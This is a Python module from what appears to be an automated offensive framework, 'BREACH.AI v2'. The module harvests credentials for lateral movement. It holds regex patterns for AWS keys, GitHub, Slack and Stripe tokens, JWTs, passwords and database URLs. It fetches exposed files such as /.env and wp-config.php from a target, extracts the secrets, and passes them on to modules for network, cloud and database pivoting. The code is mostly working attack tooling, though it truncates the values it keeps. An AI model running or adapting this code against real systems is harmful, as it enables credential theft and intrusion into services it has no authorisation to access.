"""
BREACH.AI v2 - Credential Harvester Module

Extract credentials for further access and lateral movement.
"""

import re
import json
from typing import Optional

from breach.modules.base import (
    LateralModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# Credential patterns to look for
CREDENTIAL_PATTERNS = {
    "aws_access_key": r"AKIA[A-Z0-9]{16}",
    "aws_secret_key": r"[A-Za-z0-9/+=]{40}",
    "github_token": r"ghp_[a-zA-Z0-9]{36}",
    "gitlab_token": r"glpat-[a-zA-Z0-9_-]{20}",
    "slack_token": r"xox[baprs]-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
    "stripe_key": r"sk_live_[a-zA-Z0-9]{24,}",
    "google_api": r"AIza[a-zA-Z0-9_-]{35}",
    "jwt": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
    "basic_auth": r"(?i)basic\s+[a-zA-Z0-9+/=]+",
    "bearer_token": r"(?i)bearer\s+[a-zA-Z0-9_-]+",
    "password_field": r"(?i)(password|passwd|pwd|secret)\s*[=:]\s*['\"]?([^'\"\\s]+)",
    "connection_string": r"(?i)(mysql|postgres|mongodb)://[^\\s]+",
}


@register_module
class CredentialHarvester(LateralModule):
    """
    Credential Harvester - Extract credentials for lateral movement.

    Techniques:
    - Environment variable extraction
    - Config file parsing
    - Memory/process inspection
    - Browser credential extraction
    - Database credential extraction
    """

    info = ModuleInfo(
        name="credential_harvester",
        phase=BreachPhase.LATERAL,
        description="Credential extraction for lateral movement",
        author="BREACH.AI",
        techniques=["T1552", "T1555"],  # Unsecured Credentials
        platforms=["web", "api", "cloud", "infrastructure"],
        requires_access=True,
        required_access_level=AccessLevel.USER,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if we have access to harvest credentials from."""
        return config.chain_data.get("access_gained") is not None

    async def run(self, config: ModuleConfig) -> ModuleResult:
        self._start_execution()

        credentials = []
        tokens = []

        # Harvest from different sources
        # 1. From previous findings (SQLi data, config files, etc.)
        if config.chain_data.get("data_extracted"):
            creds = self._extract_from_data(config.chain_data["data_extracted"])
            credentials.extend(creds.get("credentials", []))
            tokens.extend(creds.get("tokens", []))

        # 2. From environment variables (if we have shell access)
        if config.chain_data.get("shell_access"):
            env_creds = await self._harvest_environment(config)
            credentials.extend(env_creds.get("credentials", []))
            tokens.extend(env_creds.get("tokens", []))

        # 3. From config files
        config_creds = await self._harvest_config_files(config)
        credentials.extend(config_creds.get("credentials", []))
        tokens.extend(config_creds.get("tokens", []))

        # Deduplicate
        credentials = self._deduplicate_creds(credentials)
        tokens = self._deduplicate_tokens(tokens)

        # Add evidence
        if credentials:
            self._add_evidence(
                evidence_type=EvidenceType.CREDENTIAL,
                description=f"Harvested {len(credentials)} credentials",
                content={
                    "count": len(credentials),
                    "types": list(set(c.get("type", "unknown") for c in credentials)),
                    "services": list(set(c.get("service", "unknown") for c in credentials)),
                },
                proves="Credentials available for lateral movement",
                severity=Severity.HIGH,
                redact=True,
            )

        if tokens:
            self._add_evidence(
                evidence_type=EvidenceType.TOKEN,
                description=f"Harvested {len(tokens)} tokens",
                content={
                    "count": len(tokens),
                    "types": list(set(t.get("type", "unknown") for t in tokens)),
                },
                proves="API tokens available for service access",
                severity=Severity.HIGH,
                redact=True,
            )

        return self._create_result(
            success=len(credentials) > 0 or len(tokens) > 0,
            action="credential_harvesting",
            details=f"Harvested {len(credentials)} credentials, {len(tokens)} tokens",
            credentials_found=credentials,
            tokens_found=tokens,
            enables_modules=["network_spider", "cloud_hopper", "database_pillager"],
        )

    def _extract_from_data(self, data: any) -> dict:
        """Extract credentials from previously obtained data."""
        results = {"credentials": [], "tokens": []}

        data_str = json.dumps(data) if isinstance(data, (dict, list)) else str(data)

        for cred_type, pattern in CREDENTIAL_PATTERNS.items():
            matches = re.findall(pattern, data_str)
            for match in matches:
                value = match if isinstance(match, str) else match[1] if len(match) > 1 else match[0]

                if cred_type in ["jwt", "bearer_token", "github_token", "gitlab_token", "slack_token"]:
                    results["tokens"].append({
                        "type": cred_type,
                        "value": value[:20] + "***",
                        "source": "data_extraction",
                    })
                else:
                    results["credentials"].append({
                        "type": cred_type,
                        "value": value[:10] + "***",
                        "source": "data_extraction",
                    })

        return results

    async def _harvest_environment(self, config: ModuleConfig) -> dict:
        """Harvest credentials from environment variables."""
        # This would execute commands if we have shell access
        return {"credentials": [], "tokens": []}

    async def _harvest_config_files(self, config: ModuleConfig) -> dict:
        """Harvest credentials from config files."""
        results = {"credentials": [], "tokens": []}

        # Check for exposed config files
        config_paths = [
            "/.env", "/config/database.yml", "/config/secrets.yml",
            "/wp-config.php", "/config.php", "/settings.py",
        ]

        for path in config_paths:
            try:
                from urllib.parse import urljoin
                url = urljoin(config.target, path)
                response = await self._safe_request("GET", url, timeout=10)

                if response and response.get("status_code") == 200:
                    content = response.get("text", "")
                    if len(content) > 10:
                        # Extract credentials from content
                        extracted = self._extract_from_data(content)
                        results["credentials"].extend(extracted["credentials"])
                        results["tokens"].extend(extracted["tokens"])

            except Exception:
                continue

        return results

    def _deduplicate_creds(self, creds: list) -> list:
        """Remove duplicate credentials."""
        seen = set()
        unique = []
        for cred in creds:
            key = f"{cred.get('type')}:{cred.get('value')}"
            if key not in seen:
                seen.add(key)
                unique.append(cred)
        return unique

    def _deduplicate_tokens(self, tokens: list) -> list:
        """Remove duplicate tokens."""
        seen = set()
        unique = []
        for token in tokens:
            key = f"{token.get('type')}:{token.get('value')}"
            if key not in seen:
                seen.add(key)
                unique.append(token)
        return unique
